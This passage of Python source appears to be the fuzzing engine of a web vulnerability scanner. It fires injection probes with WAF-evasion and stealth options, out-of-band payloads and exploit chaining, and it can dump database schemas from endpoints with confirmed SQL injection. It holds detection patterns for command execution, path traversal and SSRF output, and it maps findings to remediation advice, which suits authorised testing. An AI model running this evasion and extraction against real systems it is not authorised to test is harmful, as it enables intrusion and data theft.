        stealth           = getattr(self.settings, "fuzz_stealth", False)

        self._matrix      = PayloadMatrix(profile=profile)
        self._evasion     = EvasionLayer(profile=profile, stealth=stealth)
        self._feedback    = FeedbackLoop()
        self._chainer     = ExploitChainer() if getattr(self.settings, "fuzz_chain", False) else None
        self._waf_detector = WAFDetector()
        self._semaphore   = asyncio.Semaphore(FUZZ_CONCURRENCY)
        self._session     = make_session()
        self._results:    list[FuzzResult] = []
        self._waf_state:  dict[str, tuple[bool, Optional[str], float]] = {}
        self._dry_run     = getattr(self.settings, "fuzz_dry_run", False)
        self._force_param = getattr(self.settings, "fuzz_target_param", None)
        self._extract_db  = getattr(self.settings, "extract_db", False)
        # OOB collaborator (lazy init)
        self._oob: Optional[Any] = None
        if getattr(self.settings, "collaborator_url", None):
            try:
                from modules.oob_collaborator import OOBCollaborator
                self._oob = OOBCollaborator(base_url=self.settings.collaborator_url)
            except Exception as exc:
                log.debug("[fuzz] OOB collaborator init failed: %s", exc)

    # ── Plugin management ──────────────────────────────────────────────────────

    def register_plugin(self, plugin: FuzzPluginProtocol) -> None:
        """Register a custom payload plugin."""
        self._matrix.register_plugin(plugin)

    def load_plugins_from_dir(self, plugin_dir: str) -> int:
        """
        Scan a directory for Python files exporting a `fuzz_plugin` callable.
        Returns count of loaded plugins.
        """
        import importlib.util
        from pathlib import Path
        count = 0
        for path in Path(plugin_dir).glob("*.py"):
            if path.name.startswith("_"):
                continue
            try:
                spec   = importlib.util.spec_from_file_location(path.stem, path)
                module = importlib.util.module_from_spec(spec)   # type: ignore
                spec.loader.exec_module(module)                  # type: ignore
                if hasattr(module, "fuzz_plugin"):
                    self.register_plugin(module.fuzz_plugin)
                    count += 1
            except Exception as exc:
                log.debug("[fuzz] plugin load error %s: %s", path.name, exc)
        return count

    # ── Main entry ────────────────────────────────────────────────────────────

    async def run(self) -> list[Finding]:
        """
        Run the full fuzzing phase.  Called by ScanManager._phase_fuzz().
        Returns list of Finding objects to be added to context.
        """
        endpoints = self.context.endpoints
        if not endpoints:
            log.debug("[fuzz] no endpoints to fuzz")
            return []

        # Skip already-confirmed vulnerable endpoints (avoid redundant probing)
        confirmed_urls: set[str] = set()
        for existing_f in (self.context.findings or []):
            from core.models import Confidence as _Conf
            if existing_f.confidence == _Conf.CONFIRMED:
                _ep = getattr(existing_f, "endpoint", None)
                if _ep:
                    confirmed_urls.add(getattr(_ep, "url", ""))
        if confirmed_urls:
            before = len(endpoints)
            endpoints = [ep for ep in endpoints if ep.url not in confirmed_urls]
            skipped = before - len(endpoints)
            if skipped:
                self.context.log(f"  [fuzz] {skipped} endpoint(s) skipped (already confirmed)")

        self.context.log(f"  [fuzz] fuzzing {len(endpoints)} endpoint(s) ...")

        tasks: list[asyncio.Task] = []
        for ep in endpoints:
            ec     = ContextAnalyzer.analyze(ep)
            probes = self._build_probes(ep, ec)
            for probe in probes:
                tasks.append(asyncio.create_task(self._run_probe(probe)))

        raw_results: list[FuzzResult | None] = await asyncio.gather(*tasks, return_exceptions=False)
        self._results = [r for r in raw_results if r is not None]

        findings = self._results_to_findings(self._results)

        # Exploit chaining
        if self._chainer:
            chains   = self._chainer.build_chains(findings, endpoints)
            chain_fs = self._chainer.chains_to_findings(chains)
            findings.extend(chain_fs)
            if chain_fs:
                self.context.log(f"  [fuzz] {len(chain_fs)} exploit chain(s) identified")

        # DB schema extraction (--extract-db, only fires on confirmed SQLi)
        if self._extract_db:
            sqli_findings = [f for f in findings if f.vuln_type == VulnType.SQLI]
            if sqli_findings:
                await self._phase_extract_db(sqli_findings)

        # Log evasion metrics
        if FUZZ_LOG_EVASION_METRICS:
            metrics = self._evasion.get_metrics()
            top     = self._feedback.top_techniques(5)
            self.context.log(
                f"  [fuzz] evasion metrics: {dict(list(metrics.items())[:6])}"
            )
            if top:
                self.context.log(
                    f"  [fuzz] top techniques: "
                    + ", ".join(f"{t}={s:.2f}" for t, s in top)
                )

        self.context.log(
            f"  [fuzz] complete — {len(self._results)} probes, "
            f"{len(findings)} finding(s)"
        )
        return findings

    # ── Probe building ────────────────────────────────────────────────────────

    async def _phase_extract_db(self, sqli_findings: list[Finding]) -> None:
        """Attempt DB schema extraction on confirmed SQLi endpoints."""
        try:
            from modules.db_extractor import DBExtractor
            for finding in sqli_findings[:2]:   # cap to 2 to avoid long scans
                ep    = finding.endpoint
                param = finding.evidence.notes.split("param=")[-1].split()[0] if "param=" in (finding.evidence.notes or "") else next(iter(ep.parameters), "")
                if not ep or not param:
                    continue
                extractor = DBExtractor(
                    session=self._session, endpoint=ep, param=param,
                    timeout=self.settings.timeout,
                )
                schema = await asyncio.get_running_loop().run_in_executor(
                    None, extractor.full_dump)
                self.context.log(schema.summary())
                # Attach schema summary to the finding's evidence notes
                finding.evidence.notes = (finding.evidence.notes or "") + "\n" + schema.summary()
        except Exception as exc:
            log.debug("[fuzz] DB extraction error: %s", exc)

    def _build_probes(self, endpoint: Endpoint, ec: EndpointContext) -> list[FuzzProbe]:
        """Build all probes for a single endpoint."""
        probes: list[FuzzProbe] = []
        base_headers = self._evasion.build_headers(dict(endpoint.headers))

        for payload, param, label, vt in self._matrix.generate_all(endpoint, ec):
            # --fuzz-target-param forces injection into a specific parameter
            effective_param = self._force_param if self._force_param else param
            probes.append(FuzzProbe(
                endpoint=endpoint, param=effective_param, payload=payload,
                technique=label, vuln_type=vt, headers=base_headers,
            ))

        # Append OOB probes if collaborator configured
        if self._oob:
            for oob_payload, oob_label in self._oob.inject_all(endpoint_url=endpoint.url):
                effective_param = self._force_param or next(iter(endpoint.parameters), "q")
                probes.append(FuzzProbe(
                    endpoint=endpoint, param=effective_param,
                    payload=oob_payload, technique=oob_label,
                    vuln_type=VulnType.SQLI, headers=base_headers,
                ))

        return probes

    # ── Probe execution ───────────────────────────────────────────────────────

    async def _run_probe(self, probe: FuzzProbe) -> Optional[FuzzResult]:
        """Execute one fuzz probe asynchronously, respecting concurrency limit."""
        if self._dry_run:
            log.info("[fuzz:dry-run] %s  param=%s  payload=%r",
                     probe.technique, probe.param, probe.payload[:80])
            return None

        async with self._semaphore:
            await self._evasion.jitter()
            for attempt in range(1, MAX_RETRIES + 1):
                try:
                    result = await asyncio.get_running_loop().run_in_executor(
                        None, lambda: self._fire(probe)
                    )
                    return result
                except _RateLimitError:
                    backoff = 2 ** attempt
                    log.debug("[fuzz] 429 on attempt %d — backing off %ds", attempt, backoff)
                    await asyncio.sleep(backoff)
                except Exception as exc:
                    log.debug("[fuzz] probe error %s/%s: %s", probe.vuln_type, probe.technique, exc)
                    return None
            return None  # exhausted retries

    def _fire(self, probe: FuzzProbe) -> FuzzResult:
        """
        Synchronous HTTP probe (called from thread executor).

        Injection modes:
          • GET/DELETE  → query-string params
          • POST/PUT    → form-urlencoded body  (default)
          • POST/PUT    → JSON body             (if endpoint is_api or Content-Type: application/json)
          • POST/PUT    → multipart/form-data   (if endpoint has_file_upload)
        """
        method  = (probe.endpoint.method or "GET").upper()
        url     = probe.endpoint.url
        params  = dict(probe.endpoint.parameters or {})
        params[probe.param] = probe.payload

        # Detect injection mode from endpoint content-type / tags
        content_type = ""
        for h, v in (probe.endpoint.headers or {}).items():
            if h.lower() == "content-type":
                content_type = v.lower()
                break

        is_json       = ("application/json" in content_type
                         or getattr(probe.endpoint, "is_api", False)
                         or bool(re.search(r"/(api|v\d+|rest|graphql)/", url, re.I)))
        is_multipart  = ("multipart/form-data" in content_type
                         or getattr(probe.endpoint, "has_file_upload", False))

        req_kwargs: dict[str, Any] = {
            "headers":         probe.headers,
            "timeout":         self.settings.timeout,
            "allow_redirects": True,
        }

        if method in ("POST", "PUT", "PATCH", "DELETE"):
            if is_json:
                import json as _json
                req_kwargs["json"] = params
                # Remove form-encoded headers that clash with JSON
                req_kwargs["headers"] = {
                    k: v for k, v in req_kwargs["headers"].items()
                    if k.lower() != "content-type"
                }
            elif is_multipart:
                req_kwargs["files"] = {k: (None, str(v)) for k, v in params.items()}
            else:
                req_kwargs["data"] = params
        else:
            req_kwargs["params"] = params

        t0 = time.monotonic()
        response = self._session.request(method, url=url, **req_kwargs)
        elapsed  = time.monotonic() - t0

        # WAF detection (cached per URL)
        waf_hit, waf_name, waf_conf = self._waf_state.get(
            url, WAFDetector.detect(response)
        )
        self._waf_state[url] = (waf_hit, waf_name, waf_conf)

        # Build raw response snapshot
        try:
            body = response.text[:2000]
        except Exception:
            body = ""
        raw = (
            f"HTTP/1.1 {response.status_code} {response.reason or ''}\n"
            + "\n".join(f"{k}: {v}" for k, v in response.headers.items())
            + f"\n\n{body}"
        )

        # Rate-limit detection: signal back-off retry
        if response.status_code == 429:
            raise _RateLimitError()

        notable = _is_notable(response.status_code, probe.vuln_type, response.text)
        self._feedback.record(probe.technique, notable)
        self._evasion.log_evasion_metric(probe.technique, notable)

        return FuzzResult(
            probe=probe,
            status_code=response.status_code,
            response_size=len(response.content),
            response_time=elapsed,
            raw_response=raw[:5000],
            notable=notable,
            waf_detected=waf_hit,
            waf_name=waf_name,
        )

    # ── Result → Finding conversion ───────────────────────────────────────────

    def _results_to_findings(self, results: list[FuzzResult]) -> list[Finding]:
        findings: list[Finding] = []
        seen: set[str] = set()

        for r in results:
            if not r.notable:
                continue
            dedup_key = hashlib.md5(
                f"{r.probe.endpoint.url}|{r.probe.vuln_type}|{r.probe.param}|{r.status_code}".encode()
            ).hexdigest()
            if dedup_key in seen:
                continue
            seen.add(dedup_key)

            severity   = _severity_from_vuln(r.probe.vuln_type)
            confidence = Confidence.MEDIUM if r.status_code < 500 else Confidence.LOW

            findings.append(Finding(
                vuln_type   = r.probe.vuln_type,
                severity    = severity,
                confidence  = confidence,
                title       = (
                    f"[Fuzz] {r.probe.vuln_type.value} — "
                    f"HTTP {r.status_code} on param '{r.probe.param}'"
                ),
                description = (
                    f"Fuzzer probe '{r.probe.technique}' injected payload "
                    f"{r.probe.payload!r} into parameter '{r.probe.param}' "
                    f"of {r.probe.endpoint.url} and received HTTP {r.status_code} "
                    f"({r.response_size} bytes, {r.response_time:.2f}s). "
                    + (f"WAF detected: {r.waf_name}. " if r.waf_detected else "")
                ),
                evidence=Evidence(
                    request_url         = r.probe.endpoint.url,
                    request_method      = r.probe.endpoint.method or "GET",
                    request_headers     = r.probe.headers,
                    payload_used        = r.probe.payload,
                    response_status     = r.status_code,
                    notes               = (
                        f"technique={r.probe.technique}  "
                        f"time={r.response_time:.3f}s  "
                        f"waf={r.waf_name or 'none'}"
                    ),
                    raw_response_unauth = r.raw_response,
                ),
                remediation = _remediation(r.probe.vuln_type),
                endpoint    = r.probe.endpoint,
                detector    = "fuzz",
                owasp_id    = _owasp_id(r.probe.vuln_type),
                cwe_id      = _cwe_id(r.probe.vuln_type),
                tags        = ["fuzz", r.probe.technique.split(":")[0]],
            ))

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

_ERROR_PATTERNS: dict[VulnType, list[str]] = {
    VulnType.SQLI: [
        "sql syntax", "ora-", "warning: mysql", "sqlite3", "pg_query",
        "you have an error in your sql", "unclosed quotation", "unterminated string",
    ],
    VulnType.XSS: ["<script>alert", "onerror=alert", "onload=alert"],
    VulnType.RCE: ["wgrce", "plrce", "uid=", "gid=", "root:", "whoami"],
    VulnType.DIR_TRAVERSAL: ["root:x:", "[extensions]", "boot.ini", "\\windows\\"],
    VulnType.SSRF: ["169.254.169.254", "metadata.google", "localhost", "127.0.0.1"],
}


def _is_notable(status: int, vt: VulnType, body: str) -> bool:
    """Heuristic: is this response worth flagging?"""
    if status in (200, 201, 202):
        body_lower = body.lower()
        for pattern in _ERROR_PATTERNS.get(vt, []):
            if pattern in body_lower:
                return True
    if status in (500, 503) and vt in (VulnType.SQLI, VulnType.RCE):
        return True  # server error from injection
    return False


def _severity_from_vuln(vt: VulnType) -> Severity:
    high = {VulnType.RCE, VulnType.SQLI, VulnType.SSRF, VulnType.DIR_TRAVERSAL}
    med  = {VulnType.XSS, VulnType.IDOR, VulnType.OPEN_REDIRECT, VulnType.CSRF}
    if vt in high: return Severity.HIGH
    if vt in med:  return Severity.MEDIUM
    return Severity.LOW


def _remediation(vt: VulnType) -> str:
    rems = {
        VulnType.SQLI:          "Use parameterised queries / prepared statements. Never interpolate user input into SQL.",
        VulnType.XSS:           "Apply context-sensitive output encoding. Implement a strict Content-Security-Policy.",
        VulnType.RCE:           "Never pass user input to OS commands. Use allow-lists and sandboxed execution.",
        VulnType.SSRF:          "Validate and whitelist outbound request targets. Block access to internal metadata endpoints.",
        VulnType.DIR_TRAVERSAL: "Resolve paths server-side and enforce they stay within the intended root directory.",
        VulnType.IDOR:          "Enforce object-level authorization on every resource access.",
        VulnType.OPEN_REDIRECT: "Whitelist redirect destinations. Never use raw user input as a redirect URL.",
        VulnType.CSRF:          "Implement synchronised CSRF tokens or use SameSite=Strict cookies.",
    }
    return rems.get(vt, "Review and harden the affected functionality.")


def _owasp_id(vt: VulnType) -> str:
    m = {
        VulnType.SQLI: "A03:2021", VulnType.XSS: "A03:2021",
        VulnType.RCE: "A03:2021", VulnType.SSRF: "A10:2021",
        VulnType.DIR_TRAVERSAL: "A01:2021", VulnType.IDOR: "A01:2021",
        VulnType.OPEN_REDIRECT: "A01:2021", VulnType.CSRF: "A01:2021",
    }
    return m.get(vt, "A00:2021")


def _cwe_id(vt: VulnType) -> str:
    m = {
        VulnType.SQLI: "CWE-89", VulnType.XSS: "CWE-79",
        VulnType.RCE: "CWE-78", VulnType.SSRF: "CWE-918",
        VulnType.DIR_TRAVERSAL: "CWE-22", VulnType.IDOR: "CWE-284",
        VulnType.OPEN_REDIRECT: "CWE-601", VulnType.CSRF: "CWE-352",
    }
    return m.get(vt, "CWE-0")
